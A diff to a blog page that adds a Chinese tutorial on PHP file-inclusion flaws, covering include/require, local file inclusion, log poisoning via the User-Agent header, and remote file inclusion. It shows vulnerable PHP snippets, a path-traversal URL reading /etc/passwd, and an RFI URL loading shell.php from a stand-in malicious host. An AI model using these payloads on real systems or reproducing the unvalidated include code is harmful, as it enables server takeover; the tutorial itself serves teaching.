@@ -216,7 +216,7 @@
             
                 <span class="meta-info-item post-update-date">
                     <i class="icon fa-solid fa-file-pen"></i>&nbsp;
-                    <span class="datetime" data-updated="Mon Jul 21 2025 17:11:17 GMT+0800">2025-07-21 17:11:17</span>
+                    <span class="datetime" data-updated="Sat Aug 09 2025 11:29:24 GMT+0800">2025-08-09 11:29:24</span>
                 </span>
             
         
@@ -244,6 +244,103 @@
 
                     
                          <p>参考：<a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/m0_46467017/article/details/126380415" >文件包含漏洞全面详解-CSDN博客<i class="fas fa-external-link-alt"></i></a></p>
+<p>参考：<a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/m0_46467017/article/details/126380415" >文件包含漏洞全面详解-CSDN博客<i class="fas fa-external-link-alt"></i></a></p>
+<h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><p>什么是文件包含？<br>当应用程序动态地包含外部文件（如脚本、配置文件或其他资源）时，如果未对用户输入进行严格的验证和过滤，攻击者可以通过构造恶意输入，使应用程序包含并执行非预期的文件，从而导致安全风险。</p>
+<p>tip：不需要是一定是php文件，只要含有<?php ?>代码即可被执行，甚至代码可以不需要放在上传的文件中，只要存放在可以被执行的地方即可。</p>
+<p>例如，文件限制只能上传图片，那其实可以在图片中插入php。反正能被执行就好了。</p>
+<h5 id="包含函数"><a href="#包含函数" class="headerlink" title="包含函数"></a>包含函数</h5><p>在 PHP 中，<code>include</code> 和 <code>require</code> 是用于引入外部文件的两个常用函数。它们的作用是将指定文件的内容插入到当前脚本中，以便复用代码或加载依赖文件。</p>
+<p>1.<strong><code>include</code> 函数</strong></p>
+<ul>
+<li><p><strong>作用</strong>：引入指定的文件。如果文件不存在或引入失败，PHP 会发出一个警告（<code>E_WARNING</code>），但脚本会继续执行。</p>
+</li>
+<li><p><strong>语法</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include &#x27;filename.php&#x27;;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>特点</strong>：</p>
+<ul>
+<li>文件不存在时，脚本不会终止。</li>
+<li>适合引入非核心文件，如模板文件、可选配置文件等。</li>
+</ul>
+</li>
+<li><p><strong>示例</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">include &#x27;header.php&#x27;; // 引入 header.php 文件</span><br><span class="line">echo &quot;This is the main content.&quot;;</span><br><span class="line">include &#x27;footer.php&#x27;; // 引入 footer.php 文件</span><br></pre></td></tr></table></figure></li>
+</ul>
+<hr>
+<ol start="2">
+<li><strong><code>require</code> 函数</strong></li>
+</ol>
+<ul>
+<li><p><strong>作用</strong>：引入指定的文件。如果文件不存在或引入失败，PHP 会发出一个致命错误（<code>E_COMPILE_ERROR</code>），并终止脚本执行。</p>
+</li>
+<li><p><strong>语法</strong>：</p>
+<p>php</p>
+<p>复制</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">require &#x27;filename.php&#x27;;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>特点</strong>：</p>
+<ul>
+<li>文件不存在时，脚本会终止。</li>
+<li>适合引入核心文件，如类定义、函数库等。</li>
+</ul>
+</li>
+<li><p><strong>示例</strong>：</p>
+<p>php</p>
+<p>复制</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">require &#x27;config.php&#x27;; // 引入配置文件</span><br><span class="line">require &#x27;functions.php&#x27;; // 引入函数库</span><br><span class="line">echo &quot;Application started.&quot;;</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p><strong><code>3.include_once</code> 和 <code>require_once</code></strong></p>
+<ul>
+<li><p><strong>作用</strong>：与 <code>include</code> 和 <code>require</code> 类似，但会检查文件是否已经被引入过。如果已经引入，则不会重复引入。</p>
+</li>
+<li><p><strong>语法</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">include_once &#x27;filename.php&#x27;;</span><br><span class="line">require_once &#x27;filename.php&#x27;;</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h4 id="1-本地文件包含（LFI）"><a href="#1-本地文件包含（LFI）" class="headerlink" title="1. 本地文件包含（LFI）"></a><strong>1. 本地文件包含（LFI）</strong></h4><ul>
+<li><p><strong>定义</strong>：攻击者通过利用应用程序的文件包含功能，包含并执行服务器本地的文件。</p>
+</li>
+<li><p><strong>危害</strong>：</p>
+<ul>
+<li>读取敏感文件（如<code>/etc/passwd</code>、配置文件、日志文件等）。</li>
+<li>执行恶意代码（如果文件内容可被解析，如PHP文件）。</li>
+</ul>
+</li>
+<li><p><strong>示例</strong>：</p>
+<ul>
+<li><p>假设一个PHP应用程序有以下代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$file = $_GET[&#x27;file&#x27;];</span><br><span class="line">include($file . &#x27;.php&#x27;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>攻击者可以通过以下URL读取服务器上的敏感文件：</p>
+<p><a class="link"   target="_blank" rel="noopener" href="http://example.com/index.php?file=../../../../etc/passwd" >http://example.com/index.php?file=../../../../etc/passwd<i class="fas fa-external-link-alt"></i></a></p>
+</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h5 id="日志包含"><a href="#日志包含" class="headerlink" title="日志包含"></a>日志包含</h5><p>服务器的访问日志在Apache中会被存在&#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log中；在nginx中会被存在&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log中<br>具体存储中包含请求方法，URL，浏览器情况等。因此可以在日志中包含我们的php。</p>
+<p>例如，在user_agent头中修改，改为php木马，则访问&#x2F;var&#x2F;www&#x2F;…&#x2F;access.log头时就可以对php进行触发，达到rce的目的</p>
+<h4 id="2-远程文件包含（RFI）"><a href="#2-远程文件包含（RFI）" class="headerlink" title="2. 远程文件包含（RFI）"></a><strong>2. 远程文件包含（RFI）</strong></h4><ul>
+<li><p><strong>定义</strong>：攻击者通过利用应用程序的文件包含功能，包含并执行远程服务器上的文件。</p>
+</li>
+<li><p><strong>危害</strong>：</p>
+<ul>
+<li>执行远程恶意代码（如PHP Shell）。</li>
+<li>完全控制服务器。</li>
+</ul>
+</li>
+<li><p><strong>示例</strong>：</p>
+<ul>
+<li><p>假设一个PHP应用程序有以下代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$file = $_GET[&#x27;file&#x27;];</span><br><span class="line">include($file);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>攻击者可以通过以下URL包含并执行远程恶意脚本：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/index.php?file=http://malicious-site.com/shell.php</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>如果服务器配置允许远程文件包含，攻击者可以直接在服务器上执行任意代码。</p>
+<p><strong>更多文件包含内容，详见“文件包含”</strong></p>
+</li>
+</ul>
+</li>
+</ul>
 
                     
                 </div>
@@ -388,7 +485,7 @@
             <div class="pc-post-toc left-toc">
                 <div class="post-toc-wrap border-box">
     <div class="post-toc border-box">
-        
+        <ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="nav-number">1.</span> <span class="nav-text">文件包含</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%8C%85%E5%90%AB%E5%87%BD%E6%95%B0"><span class="nav-number">1.0.1.</span> <span class="nav-text">包含函数</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%88LFI%EF%BC%89"><span class="nav-number">1.1.</span> <span class="nav-text">1. 本地文件包含（LFI）</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%97%A5%E5%BF%97%E5%8C%85%E5%90%AB"><span class="nav-number">1.1.1.</span> <span class="nav-text">日志包含</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%88RFI%EF%BC%89"><span class="nav-number">1.2.</span> <span class="nav-text">2. 远程文件包含（RFI）</span></a></li></ol></li></ol>
     </div>
 </div>
 
@@ -557,7 +654,7 @@
             <div class="tablet-post-toc">
                 <div class="post-toc-wrap border-box">
     <div class="post-toc border-box">
-        
+        <ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="nav-number">1.</span> <span class="nav-text">文件包含</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%8C%85%E5%90%AB%E5%87%BD%E6%95%B0"><span class="nav-number">1.0.1.</span> <span class="nav-text">包含函数</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%88LFI%EF%BC%89"><span class="nav-number">1.1.</span> <span class="nav-text">1. 本地文件包含（LFI）</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%97%A5%E5%BF%97%E5%8C%85%E5%90%AB"><span class="nav-number">1.1.1.</span> <span class="nav-text">日志包含</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%88RFI%EF%BC%89"><span class="nav-number">1.2.</span> <span class="nav-text">2. 远程文件包含（RFI）</span></a></li></ol></li></ol>
     </div>
 </div>
 
